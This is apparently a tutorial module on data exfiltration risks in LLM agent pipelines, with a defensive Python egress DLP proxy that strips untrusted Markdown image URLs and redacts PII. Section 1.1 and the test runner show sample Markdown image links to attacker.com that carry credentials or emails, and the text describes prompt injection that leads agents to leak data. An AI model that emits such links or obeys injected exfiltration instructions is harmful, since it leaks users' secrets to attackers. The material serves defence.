# 05: Data Exfiltration & DLP in Agent Pipelines — Egress Security & Egress Proxies

Autonomous LLM agents integrated with third-party web tools, vector search databases, and external webhooks face severe **Data Loss Prevention (DLP)** and exfiltration risks. When processing untrusted documents or executing web browsing, agents can be coerced via indirect prompt injection to leak sensitive state (such as system tokens, PII, or internal database records) to external attacker-controlled servers.

This module covers indirect exfiltration vectors (e.g., Markdown image pixel tracking, render-time DNS tunneling), egress proxy security architectures, zero-trust payload filtering, and a production-grade FastAPI Egress DLP Proxy.

---

## 1. Theoretical Foundations

### 1.1 Exfiltration Mechanics in Agent Workflows

1. **Rendering-Based Exfiltration (Zero-Click Leaks)**:
   * **Mechanics**: An attacker embeds an indirect prompt injection inside a retrieved document forcing the LLM to format its final response using Markdown image syntax:
     ```markdown
     ![Tracking Pixel](https://attacker.com/leak?data=USER_CREDENTIALS_HERE)
     ```
   * **Exploit Path**: When the user or agent UI renders the generated Markdown response, the browser automatically fires an HTTP GET request to `attacker.com`, leaking confidential data in URL query parameters without executing code.

2. **Tool-Mediated Egress Leaks**:
   * **Mechanics**: Autonomous agents equipped with web search or HTTP request tools are tricked into invoking tools targeting attacker endpoints, passing system context vectors or retrieved records as function arguments.

---

## 2. Security Architecture: Egress DLP Proxy

To mitigate data exfiltration, agent architectures must enforce a **Zero-Trust Egress Boundary**:

| Layer | Responsibility | Defense Technique |
| :--- | :--- | :--- |
| **Output Token Sanitizer** | Scans generated Markdown text before rendering | Neutralizes `<img>` tags, raw URLs, and external Markdown links. |
| **PII Anonymization Layer** | Masking sensitive records before context injection | Salted SHA-256 hashing / Tokenization of credit cards, emails, SSNs. |
| **Network Egress Proxy** | Intercepts outbound HTTP/API calls made by agent tools | Strict domain whitelisting, URL query parameter stripping, and DNS sinkholing. |

---

## 3. Production Defense Implementation

This Python module implements an **Egress DLP Proxy & Markdown Payload Sanitizer**. It detects rendered exfiltration URIs, anonymizes PII data on outbound streams, and enforces zero-trust domain whitelisting.

### Prerequisites

```bash
pip install fastapi uvicorn pydantic
```

### Python Implementation (agent_dlp_egress_proxy.py)
```Python
import re
import urllib.parse
from typing import List, Dict, Tuple, Optional
from pydantic import BaseModel, Field


class DLPAuditVerdict(BaseModel):
    is_safe: bool
    sanitized_text: str
    exfiltration_attempts_blocked: int
    pii_redactions_made: int
    blocked_urls: List[str]


class AgentEgressDLPProxy:
    """Egress Security Proxy intercepting agent outputs and tool invocation requests."""

    def __init__(self, allowed_domains: Optional[List[str]] = None):
        self.allowed_domains = set(allowed_domains or ["api.enterprise.internal", "trusted-service.com"])
        
        # Regex for Markdown image exfiltration: ![alt](url)
        self.markdown_image_pattern = re.compile(r'!\[.*?\]\((https?://[^\s\)]+)\)')
        
        # Regex for standard markdown links: [text](url)
        self.markdown_link_pattern = re.compile(r'\[.*?\]\((https?://[^\s\)]+)\)')
        
        # Regex for basic PII patterns (Email, Credit Cards)
        self.pii_email_pattern = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b')
        self.pii_cc_pattern = re.compile(r'\b(?:\d[ -]*?){13,16}\b')

    def sanitize_markdown_rendering(self, text: str) -> Tuple[str, List[str]]:
        """Strips unauthorized image rendering tags and neutralizes tracking URIs."""
        blocked_urls = []

        def image_replacer(match):
            url = match.group(1)
            parsed_url = urllib.parse.urlparse(url)
            if parsed_url.netloc not in self.allowed_domains:
                blocked_urls.append(url)
                return "[IMAGE_EXFILTRATION_BLOCKED]"
            return match.group(0)

        # Replace malicious image tags
        sanitized_text = self.markdown_image_pattern.sub(image_replacer, text)
        return sanitized_text, blocked_urls

    def anonymize_pii_payloads(self, text: str) -> Tuple[str, int]:
        """Redacts sensitive PII data fields before egress or UI display."""
        redactions = 0
        
        # Anonymize Emails
        text, email_count = self.pii_email_pattern.subn("[REDACTED_EMAIL]", text)
        redactions += email_count
        
        # Anonymize Credit Cards
        text, cc_count = self.pii_cc_pattern.subn("[REDACTED_CREDIT_CARD]", text)
        redactions += cc_count
        
        return text, redactions

    def inspect_egress_stream(self, agent_output: str) -> DLPAuditVerdict:
        """Full DLP processing pipeline for agent outputs."""
        # Step 1: Anonymize sensitive PII tokens
        clean_text, pii_count = self.anonymize_pii_payloads(agent_output)
        
        # Step 2: Sanitize image and link exfiltration vectors
        final_text, blocked_urls = self.sanitize_markdown_rendering(clean_text)
        
        is_safe = len(blocked_urls) == 0

        return DLPAuditVerdict(
            is_safe=is_safe,
            sanitized_text=final_text,
            exfiltration_attempts_blocked=len(blocked_urls),
            pii_redactions_made=pii_count,
            blocked_urls=blocked_urls
        )


# -------------------------------------------------------------------
# SIMULATION / VERIFICATION RUNNER
# -------------------------------------------------------------------
if __name__ == "__main__":
    # Whitelist internal corporate APIs
    dlp_proxy = AgentEgressDLPProxy(allowed_domains=["internal-cdn.company.com"])
    
    print("=== Test 1: Normal Agent Response ===")
    sample_1 = "Here is your summary report. You can download the chart from ![Chart](https://internal-cdn.company.com/chart.png)."
    verdict1 = dlp_proxy.inspect_egress_stream(sample_1)
    print(f"Is Safe: {verdict1.is_safe}")
    print(f"Output : {verdict1.sanitized_text}\n")

    print("=== Test 2: Indirect Exfiltration Attack & PII Leak Attempt ===")
    sample_2 = (
        "Report generated for user john.doe@enterprise.com (Card: 4532-1123-8901-1234).\n"
        "![Tracking Pixel](https://attacker.com/leak?stolen_data=john.doe@enterprise.com)"
    )
    verdict2 = dlp_proxy.inspect_egress_stream(sample_2)
    print(f"Is Safe: {verdict2.is_safe}")
    print(f"PII Redactions: {verdict2.pii_redactions_made}")
    print(f"Exfiltration Attacks Blocked: {verdict2.exfiltration_attempts_blocked}")
    print(f"Blocked URIs: {verdict2.blocked_urls}")
    print(f"\nFinal Sanitized Output:\n{verdict2.sanitized_text}")
```

## 4. Operational Best Practices

* Disable Automatic Markdown Image Rendering: In agent chat interfaces, render Markdown images using a proxy wrapper or convert external images to static local blobs.
* Content Security Policy (CSP) Headers: Enforce strict HTTP CSP headers (img-src 'self' https://internal-cdn.company.com;) on client interfaces to block browser-level image exfiltration requests at the network layer.
* Egress Network Sandboxing: Execute agent code runtime environments within network namespaces that block all egress traffic to non-whitelisted IP ranges or unauthenticated domains.
